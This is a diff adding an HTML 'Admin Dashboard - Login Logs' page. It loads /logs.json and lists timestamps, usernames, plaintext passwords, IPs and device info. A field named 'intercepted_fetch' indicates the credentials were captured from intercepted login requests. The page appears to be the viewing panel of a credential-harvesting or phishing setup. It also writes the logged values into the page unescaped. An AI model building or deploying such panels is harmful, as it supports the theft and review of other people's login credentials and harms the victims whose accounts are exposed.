@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard - Login Logs</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 20px; background-color: #f4f4f7; }
+        h1 { color: #333; }
+        table { width: 100%; border-collapse: collapse; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid #eee; }
+        th { background-color: #007bff; color: white; font-weight: 600; text-transform: uppercase; font-size: 12px; letter-spacing: 0.05em; }
+        tr:hover { background-color: #f8f9fa; }
+        .timestamp { white-space: nowrap; color: #666; font-size: 0.9em; }
+        .ip { color: #007bff; font-family: monospace; }
+        .refresh-btn { margin-bottom: 20px; padding: 10px 20px; background: #28a745; color: white; border: none; border-radius: 4px; cursor: pointer; }
+        .refresh-btn:hover { background: #218838; }
+        .no-logs { padding: 20px; text-align: center; color: #666; }
+    </style>
+</head>
+<body>
+    <h1>Admin Dashboard - Login Logs</h1>
+    <button class="refresh-btn" onclick="fetchLogs()">Refresh Logs</button>
+    <table id="logsTable">
+        <thead>
+            <tr>
+                <th>Timestamp</th>
+                <th>Username/Email</th>
+                <th>Password</th>
+                <th>IP Address</th>
+                <th>Device Info</th>
+            </tr>
+        </thead>
+        <tbody id="logsBody">
+            <!-- Logs will be loaded here -->
+        </tbody>
+    </table>
+
+    <script>
+        async function fetchLogs() {
+            const logsBody = document.getElementById('logsBody');
+            try {
+                const response = await fetch('/logs.json');
+                const logs = await response.json();
+                
+                logsBody.innerHTML = '';
+                if (logs.length === 0) {
+                    logsBody.innerHTML = '<tr><td colspan="5" class="no-logs">No logs recorded yet.</td></tr>';
+                    return;
+                }
+
+                // Show most recent logs first
+                logs.reverse().forEach(log => {
+                    const row = document.createElement('tr');
+                    row.innerHTML = `
+                        <td class="timestamp">${log.timestamp || 'N/A'}</td>
+                        <td><strong>${log.username || log.intercepted_fetch?.username || 'N/A'}</strong></td>
+                        <td>${log.password || log.intercepted_fetch?.password || '<span style="color:#ccc">Hidden</span>'}</td>
+                        <td class="ip">${log.ip || 'N/A'}</td>
+                        <td style="font-size: 0.8em; color: #666;">${log.userAgent || log.device || 'N/A'}</td>
+                    `;
+                    logsBody.appendChild(row);
+                });
+            } catch (err) {
+                console.error('Failed to fetch logs:', err);
+                logsBody.innerHTML = '<tr><td colspan="5" class="no-logs" style="color:red">Error loading logs. Make sure the server is running.</td></tr>';
+            }
+        }
+
+        // Initial load
+        fetchLogs();
+    </script>
+</body>
+</html>
